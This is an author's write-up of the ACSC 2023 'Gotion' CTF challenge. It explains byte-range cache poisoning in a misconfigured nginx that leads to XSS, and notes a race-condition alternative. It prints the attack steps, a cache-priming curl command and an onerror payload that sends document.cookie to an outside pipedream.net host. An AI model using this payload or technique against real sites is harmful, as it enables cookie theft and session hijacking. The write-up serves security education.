<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width"><script type=application/javascript src=https://blog.tyage.net/js/theme-mode.js></script>
<link rel=stylesheet href=https://blog.tyage.net/css/frameworks.min.css><link rel=stylesheet href=https://blog.tyage.net/css/github.min.css><link rel=stylesheet href=https://blog.tyage.net/css/github-style.css><link rel=stylesheet href=https://blog.tyage.net/css/light.css><link rel=stylesheet href=https://blog.tyage.net/css/dark.css><link rel=stylesheet href=https://blog.tyage.net/css/syntax.css><title>ACSC 2023 Gotion Challenge Author Writeup - blog.tyage.net</title><link rel=icon type=image/x-icon href=https://blog.tyage.net/images/favicon.ico><meta name=theme-color content="#1e2327"><script>const match=location.search.match(/^\?p=(\d+)$/);if(location.pathname==="/"&&match!==null){const e=match[1];history.replaceState({previousUrl:location.href},"",`/p${e}/`),location.reload()}else history.state!==null&&history.state.previousUrl&&history.replaceState({},"",history.state.previousUrl)</script><style>.blog-post p{line-height:1.8}</style><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script></head><body><div style=position:relative><header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on"><div class="Header-item mobile-none" style=margin-top:-4px;margin-bottom:-4px><a class=Header-link href=https://blog.tyage.net/><svg class="octicon" height="32" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a></div><div class="Header-item d-md-none"><button class="Header-link btn-link js-details-target" type=button onclick='document.querySelector("#header-search").style.display=document.querySelector("#header-search").style.display=="none"?"block":"none"'><svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M1 2.75A.75.75.0 011.75 2h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 2.75zm0 5A.75.75.0 011.75 7h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 7.75zM1.75 12a.75.75.0 100 1.5h12.5a.75.75.0 100-1.5H1.75z"/></svg></button></div><div style=display:none id=header-search class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex"><div class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to"><div class=position-relative><form target=_blank action=https://www.google.com/search accept-charset=utf-8 method=get autocomplete=off><label class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center"><input type=text class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" name=q placeholder=Search autocomplete=off>
<input type=hidden name=q value=site:https://blog.tyage.net/></label></form></div></div></div><div class="Header-item Header-item--full flex-justify-center d-md-none position-relative"><a class=Header-link href=https://blog.tyage.net/><svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a></div><div class=Header-item style=margin-right:0><a href=javascript:void(0) class="Header-link no-select" onclick=switchTheme()><svg style="fill:var(--color-profile-color-modes-toggle-moon)" class="no-select" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.52208 7.71754c3.05612.0 5.53362-2.47748 5.53362-5.5336C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961 9.95801 1.07727 10.3495.771159 10.6474.99992c1.4679 1.12724 2.4141 2.90007 2.4141 4.89391.0 3.40575-2.7609 6.16667-6.16665 6.16667-2.94151.0-5.40199-2.0595-6.018122-4.81523C.794841 6.87902 1.23668 6.65289 1.55321 6.85451 2.41106 7.40095 3.4296 7.71754 4.52208 7.71754z"/></svg></a></div></header></div><div><main><div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4"><div class=px-0><div class="mb-3 d-flex px-3 px-md-3 px-lg-5"><div class="flex-auto min-width-0 width-fit mr-3"><div class=d-flex><div class="d-none d-md-block"><a class="avatar mr-2 flex-shrink-0" href=https://blog.tyage.net/><img class=avatar-user src=/icon/icon.jpg width=32 height=32></a></div><div class="d-flex flex-column"><h1 class="break-word f3 text-normal mb-md-0 mb-1"><span class=author><a href=https://blog.tyage.net/>tyage</a></span><span class=path-divider>/</span><strong class="css-truncate-target mr-1" style=max-width:410px><a href=https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/>ACSC 2023 Gotion Challenge Author Writeup</a></strong></h1><div class="note m-0">Created <relative-time datetime="Sun, 12 Mar 2023 00:00:00 +0900" class=no-wrap>Sun, 12 Mar 2023 00:00:00 +0900</relative-time></div></div></div></div></div></div></div><div class="container-lg px-3 new-discussion-timeline"><div class="repository-content gist-content"><div><div class="js-gist-file-update-container js-task-list-container file-box"><div id=file-pytest class="file my-2"><div id=post-header class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style=z-index:2><div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0"><summary id=toc-toggle onclick=clickToc() class="btn btn-octicon m-0 mr-2 p-2"><svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zM3 8A1 1 0 111 8a1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"/></svg></summary><details-menu class=SelectMenu id=toc-details style="display: none;"><div class="SelectMenu-modal rounded-3 mt-1" style=max-height:340px><div class="SelectMenu-list SelectMenu-list--borderless p-2" style=overscroll-behavior:contain id=toc-list></div></div></details-menu>755 Words</div><div class="file-actions flex-order-2 pt-0"></div></div></div><div class="Box-body px-5 pb-5" style=z-index:1><article class="markdown-body entry-content container-lg"><p>I made a Gotion Challenge in <a href=https://acsc.asia/>ACSC</a> (Asian Cyber Security Challenge) 2023.</p><p>This is a byte-range cache poisoning XSS challenge.</p><p>Challenge Description:</p><pre tabindex=0><code>Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one!
</code></pre><p>Challenge Repository: <a href=https://github.com/tyage/acsc2023-gotion>https://github.com/tyage/acsc2023-gotion</a></p><blockquote class=twitter-tweet><p lang=en dir=ltr>In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! <a href=https://t.co/SN4PXKkKid>pic.twitter.com/SN4PXKkKid</a></p>&mdash; もうダニ by 左京区在中 (@tyage) <a href="https://twitter.com/tyage/status/1629679515529281536?ref_src=twsrc%5Etfw">February 26, 2023</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><h1 id=challenge-details>Challenge Details</h1><p>The challenge has three components: Go web application, nginx and bot.
This is obviously an XSS challenge as the bot has FLAG in the cookie.</p><p>The Go app allows users to create simple note pages with only title and body.
The title &ldquo;Gotion&rdquo; is a parody of the famous note-taking app Notion and Go.</p><p>Users can enter title and body, but they are HTML escaped.
Therefore it is not possible to cause XSS in the notes page.</p><p>The key points here are that notes have their own unique URL and Gotion creates static HTML files for each note page like SSG (Static Site Generator).
Users can control the last part of the note URL, but they are only allowed to use restricted characters <code>[a-zA-Z0-9 ]</code>.</p><p>Looking inside nginx, the config file has a suspicious cache directive.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>proxy_cache_path</span> <span style=color:#e6db74>/tmp/nginx</span> <span style=color:#e6db74>keys_zone=mycache:10m</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>server</span> {
</span></span><span style=display:flex><span>    <span style=color:#f92672>listen</span> <span style=color:#ae81ff>80</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>location</span> ~ <span style=color:#e6db74>.mp4$</span> {
</span></span><span style=display:flex><span>        <span style=color:#75715e># Smart and Efficient Byte-Range Caching with NGINX
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e># https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>proxy_cache</span> <span style=color:#e6db74>mycache</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>slice</span>              <span style=color:#ae81ff>4096</span>; <span style=color:#75715e># Maybe it should be bigger?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>proxy_cache_key</span>    $host$uri$is_args$args$slice_range;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_set_header</span>   <span style=color:#e6db74>Range</span> $slice_range;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_http_version</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>.1</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_cache_valid</span>  <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>206</span> <span style=color:#e6db74>1h</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>http://app:3000</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>location</span> <span style=color:#e6db74>/</span> {
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>http://app:3000</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This directive caches an mp4 file, but it is not a normal cache, it is a <a href=https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/>byte-range cache</a> which allows us to cache part of the content.
When a client requests <code>Range: bytes=0-1000</code>, nginx requests the content with a <code>Range: bytes=0-4095</code> header to the origin server and caches the response.
If a client requests <code>Range: bytes=0-1000</code> again, nginx can respond quickly because there is a cache of the first 4096 bytes.</p><p>This config file also has an error in the location directive.
The <code>.</code> in <code>location ~ .mp4$</code> does not mean <code>.</code> but any character, because this is RegExp.
This directive was made for the video file <code>howto.mp4</code> but the file such as <code>FOOBARmp4</code> will unfortunately be cached.</p><h1 id=solution>Solution</h1><p>The solution is byte range cache poisoning, which causes nginx to return HTML containing XSS payload.</p><p>This is possible because nginx concatenates segmented caches.
Consider a situation where nginx has the content cache, but only the first 4096 bytes, and the content was updated later.
When a client makes a request without a range header, nginx will retrieve the rest of the updated content and concatenate it with the first cache.</p><p>In other words, we can concatenate the sliced parts of two different HTMLs!</p><p>The steps to exploit this into XSS are below.</p><ol><li><p>Create a note page whose URL ends with <code>AAAAAAAAAAAAAAAAAmp4</code> so that it will be cached.</p></li><li><p>Modify the HTML of the note so that the first 4096 bytes end with <code>&lt;</code>.</p></li></ol><p>The first 4096 bytes of HTML will look like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>          &lt;<span style=color:#f92672>textarea</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;body&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;note&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;height: 300px;&#34;</span>&gt;AAAA...AAAAA<span style=color:#960050;background-color:#1e0010>&lt;</span>
</span></span></code></pre></div><ol start=3><li><p>Cache the first 4096 bytes with a range header <code>curl http://.../...AAAAAAAAAAAAAAAAAmp4 -H "Range: bytes=0-4095"</code>.</p></li><li><p>Update the page so that the second 4096 bytes block starts with <code>img src=x onerror=[payload here]</code>.</p></li></ol><p>The second block will look like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>img src=x onerror=location=`//eo7x31ojradre3r.m.pipedream.net/?c=${document.cookie}` x=&lt;/<span style=color:#f92672>textarea</span>&gt;
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><ol start=5><li><p>Report the URL <code>http://.../...AAAAAAAAAAAAAAAAAmp4</code></p></li><li><p>Wait for the flag and done!</p></li></ol><p>The full solution script is here <a href=https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py>https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py</a>.</p><h1 id=unintended-solution>Unintended Solution</h1><p>There is an unintended solution.
I forgot to write an exclusive lock when Go app write a HTML to file.</p><p><a href=https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117>https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span>		<span style=color:#a6e22e>f</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>OpenFile</span>(<span style=color:#a6e22e>noteFilePath</span>, <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>O_WRONLY</span>|<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>O_TRUNC</span>, <span style=color:#ae81ff>0644</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Error</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;invalid note&#34;</span>, <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusInternalServerError</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>WriteNote</span>(<span style=color:#a6e22e>f</span>, <span style=color:#a6e22e>NoteParam</span>{
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Id</span>:    <span style=color:#a6e22e>noteId</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>URL</span>:   <span style=color:#a6e22e>noteURL</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Title</span>: <span style=color:#a6e22e>title</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Body</span>:  <span style=color:#a6e22e>body</span>,
</span></span><span style=display:flex><span>		})
</span></span></code></pre></div><p>It causes race condition when the app process <code>WriteNote</code> at the same time and it was possible to store broken HTML causing XSS.</p><h1 id=comment>Comment</h1><p>To make a challenge solvable, origin HTTP server must support byte-range request and must <em>not</em> return E-Tag header.
Fortunately, Go net/http server meets these requirements therefore I chose the Go server.</p><p>Not only nginx but also some other HTTP cache servers and CDNs have this kind of implementation, so I think this concept has a chance to be exploited in a real environment.</p><p>I think this is the first PoC of byte-range cache poisoning XSS and I wish the participants have enjoyed the challenge!</p></article></div></div></div></div></div></div></main></div><script type=application/javascript src=https://blog.tyage.net/js/toc.js></script>
<link rel=stylesheet href=https://blog.tyage.net/css/toc.css><div class="footer container-xl width-full p-responsive"><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><a aria-label=Homepage title=GitHub class="footer-octicon d-none d-lg-block mr-lg-4" href=https://blog.tyage.net/><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0">Theme by <a href=https://github.com/MeiK2333/github-style>github-style</a></li></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div></body><script type=application/javascript src=https://blog.tyage.net/js/github-style.js></script></html>